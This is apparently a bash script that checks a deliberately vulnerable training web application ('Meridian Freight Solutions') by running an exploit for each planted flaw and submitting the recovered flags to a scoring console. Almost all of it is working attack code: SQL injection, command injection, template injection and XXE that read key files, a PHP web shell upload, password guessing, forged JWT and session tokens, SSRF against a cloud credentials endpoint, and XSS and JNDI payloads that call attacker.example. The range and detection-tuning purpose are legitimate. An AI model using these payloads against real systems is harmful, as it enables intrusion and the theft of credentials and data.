#!/usr/bin/env bash
# Exercises every finding on the Meridian Freight Solutions target end to end,
# records each recovered value in the operator console, and reports pass/fail.
#
# Use it to verify a deployment and to generate a complete event set for
# detection tuning.
#
#   ./tools/validate_range.sh http://127.0.0.1:5005
set -uo pipefail

BASE="${1:-http://127.0.0.1:5005}"
APP_ROOT="${APP_ROOT:-/app}"                     # container path for file-read payloads
TEAM="${TEAM:-validation-bot}"
TOKEN="${RANGE_CONSOLE_TOKEN:-range-operator}"   # operator console gate
PYTHON="${PYTHON:-python3}"                      # needs Flask only for the session forge
JAR="$(mktemp -d)/cookies.txt"
PASS=0; FAIL=0; declare -a FAILED=()

c()  { curl -s -b "$JAR" -c "$JAR" -H "X-Lab-Test-ID: validate" "$@"; }
cj() { c -H 'Content-Type: application/json' "$@"; }

# Proof values are embedded in recovered data, not returned in a labelled field.
grab() { grep -o 'MERIDIAN{[^}]*}' | head -1; }

record() {  # record <finding-id> <recovered-value>
  local id="$1" value="${2:-}"
  if [[ -z "$value" ]]; then
    printf '  \033[31mFAIL\033[0m %-22s nothing recovered\n' "$id"
    FAIL=$((FAIL+1)); FAILED+=("$id"); return
  fi
  local body; body=$(cj -H "X-Range-Token: $TOKEN" -X POST "$BASE/range/api/submit" \
                        -d "{\"value\":\"$value\"}")
  if grep -q '"correct":true' <<<"$body"; then
    printf '  \033[32mPASS\033[0m %-22s %s\n' "$id" "$value"; PASS=$((PASS+1))
  else
    printf '  \033[31mFAIL\033[0m %-22s rejected: %s\n' "$id" "$body"
    FAIL=$((FAIL+1)); FAILED+=("$id")
  fi
}

echo "== Meridian target validation against $BASE =="
cj -H "X-Range-Token: $TOKEN" -X POST "$BASE/range/api/team" -d "{\"team\":\"$TEAM\"}" >/dev/null

echo "-- reconnaissance and exposed files --"
c "$BASE/robots.txt" >/dev/null
record recon-runbook       "$(c "$BASE/internal/it-runbook.txt" | grab)"
record misconfig-debug     "$(c "$BASE/status/diagnostics" | grab)"
record misconfig-dotenv    "$(c "$BASE/.env" | grab)"
c "$BASE/backups/" >/dev/null
record misconfig-backups   "$(c "$BASE/backups/meridian-db-export.sql" | grab)"

echo "-- broken access control --"
record idor-shipment       "$(c "$BASE/api/v1/shipments/MFS-2026-4471" | grab)"
record access-massassign   "$(cj -X POST "$BASE/portal/profile" \
                               -d '{"contact_name":"Dana Okafor","account_type":"operations"}' | grab)"

echo "-- injection --"
record sqli-union          "$(c -G "$BASE/api/v1/rates/search" \
                               --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " | grab)"
record sqli-authbypass     "$(cj -X POST "$BASE/portal/login?legacy=1" \
                               -d '{"username":"ops_console'\''-- ","password":"x"}' | grab)"
c -G "$BASE/search" --data-urlencode 'q=<script>alert(1)</script>' >/dev/null
# The agent's captured cookie is base64; decode it to read the token inside.
# base64 of a JSON object always begins "eyJ"; anchoring there avoids matching
# the cookie name and the '=' that separates it.
b64decode_grab() { grep -o 'eyJ[A-Za-z0-9+/=]*' | while read -r blob; do
                     printf '%s' "$blob" | base64 -d 2>/dev/null; done | grab; }
record xss-reflected       "$(c -G "$BASE/support/shared-search" \
                               --data-urlencode 'q=<script>fetch("//attacker.example")</script>' \
                               | b64decode_grab)"
cj -X POST "$BASE/contact" \
   -d '{"name":"tester","company":"Acme","email":"t@acme.example","message":"<script>steal()</script>"}' >/dev/null

echo "-- file handling and code execution --"
record traversal-invoice   "$(c -G "$BASE/api/v1/invoices/download" \
                               --data-urlencode '../instance/app-secrets.ini' \
                               --data-urlencode 'document=../instance/app-secrets.ini' | grab)"
record rce-cmdi            "$(cj -X POST "$BASE/admin/diagnostics" \
                               -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}' | grab)"
SSTI="{{ cycler.__init__.__globals__.__builtins__.open('instance/keys/campaign-signing.key').read() }}"
record rce-ssti            "$(c -G "$BASE/admin/campaigns/preview" --data-urlencode "body=$SSTI" | grab)"
EDI_BODY='<?xml version="1.0"?><!DOCTYPE m [<!ENTITY x SYSTEM "file://'"$APP_ROOT"'/instance/edi/partner-manifest.key">]><manifest>&x;</manifest>'
record xxe-edi             "$(c -X POST "$BASE/api/v1/edi/manifest" \
                               -H 'Content-Type: application/xml' --data-binary "$EDI_BODY" | grab)"
printf '<?php system($_GET["c"]); ?>\n' > /tmp/cv.php
c -X POST "$BASE/careers/apply" -F 'cv=@/tmp/cv.php' >/dev/null
c "$BASE/uploads/" >/dev/null
record upload-unrestricted "$(c "$BASE/uploads/hr-onboarding-pack-2026.txt" | grab)"

echo "-- authentication and session handling --"
for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
  cj -X POST "$BASE/portal/login" -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}" > /tmp/login.json
done
record auth-bruteforce     "$(grab < /tmp/login.json)"

HEADER="$(printf '%s' '{"alg":"none","typ":"JWT"}'          | base64 | tr -d '=\n' | tr '/+' '_-')"
PAYLOAD="$(printf '%s' '{"sub":"harborline","role":"finance"}' | base64 | tr -d '=\n' | tr '/+' '_-')"
record jwt-none            "$(c -H "Authorization: Bearer $HEADER.$PAYLOAD." \
                               "$BASE/api/v1/reports/financial" | grab)"

md5of() { if command -v md5sum >/dev/null; then printf '%s' "$1" | md5sum | cut -d' ' -f1;
          else printf '%s' "$1" | md5 -q; fi; }
RESET="$(md5of avoss)"
RESET_BODY='{"username":"avoss","token":"'"$RESET"'"}'
cj -X POST "$BASE/portal/reset" -d '{"username":"avoss"}' >/dev/null
record reset-token         "$(cj -X POST "$BASE/api/v1/account/reset" -d "$RESET_BODY" | grab)"

FORGED="$("$PYTHON" tools/forge_session.py --secret "${LAB_SESSION_SECRET:-meridian-default-signing-key}")"
record weak-session-secret "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grab)"

echo "-- stored payload rendered by staff --"
record xss-stored          "$(curl -s -H "Cookie: session=$FORGED" "$BASE/admin/messages" \
                               | b64decode_grab)"

echo "-- ssrf, business logic and vulnerable components --"
record ssrf-metadata       "$(c -G "$BASE/admin/integrations/preview" --data-urlencode \
  "url=${METADATA_URL:-http://metadata:8080}/latest/meta-data/iam/security-credentials/mfs-web-instance-role" | grab)"
record logic-negative-quote "$(cj -X POST "$BASE/services/quote" \
                               -d '{"weight_kg":-1200,"rate_per_kg":0.42}' | grab)"
record jndi-audit          "$(c -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' \
                               "$BASE/api/v1/audit/event" | grab)"

echo
echo "== $PASS passed, $FAIL failed =="
[[ $FAIL -eq 0 ]] || { printf 'failed: %s\n' "${FAILED[*]}"; exit 1; }
